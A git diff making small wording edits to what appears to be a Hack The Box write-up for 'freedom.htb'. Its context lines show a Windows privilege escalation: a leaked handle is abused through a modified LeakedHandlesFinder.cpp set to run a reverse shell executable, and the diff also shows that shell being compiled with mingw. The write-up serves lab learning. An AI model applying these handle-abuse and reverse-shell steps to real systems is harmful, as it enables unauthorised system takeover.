@@ -281,7 +281,7 @@ Vulnerable      : True
 Description     : The current user has modification rights on this root folder. A total of 18 common application files were found. The current user has modification rights on some, or all of them.
 ```
 
-The web application was running on Ubuntu in WSL. It explains the header on <http://freedom.htb/>
+The web application was running on Ubuntu in WSL. It explains the server header on <http://freedom.htb/>
 
 ```text
 ┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -304,7 +304,7 @@ StartMode   : Automatic
 #.....SNIP.....
 ```
 
-It is not a default service. A similar executable in present the user directory:
+It is not a default service. A similar executable in present on `j.bret`'s desktop:
 
 ```console
 PS C:\Users\j.bret\Desktop> ls
@@ -317,7 +317,7 @@ Mode                LastWriteTime         Length Name
 -a----        12/2/2024   3:24 AM             27 user.txt
 ```
 
-Furthermore, there's an exploitable leaked handle:
+Furthermore, an exploitable leaked handle can be accessed:
 
 ```text
 ┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -362,7 +362,7 @@ I modified `LeakedHandlesFinder.cpp` and rebuilt the solution:
 +     _tcscpy_s(conf.ExploitCommand, MAX_PATH, _T("C:\\Windows\\Tasks\\revshell.exe"));
 ```
 
-I also compiled a reverse shell:
+I also compiled a reverse shell executable:
 
 ```console
 inte@debian-pc:~$ x86_64-w64-mingw32-gcc -o revshell.exe revshell.c -lws2_32
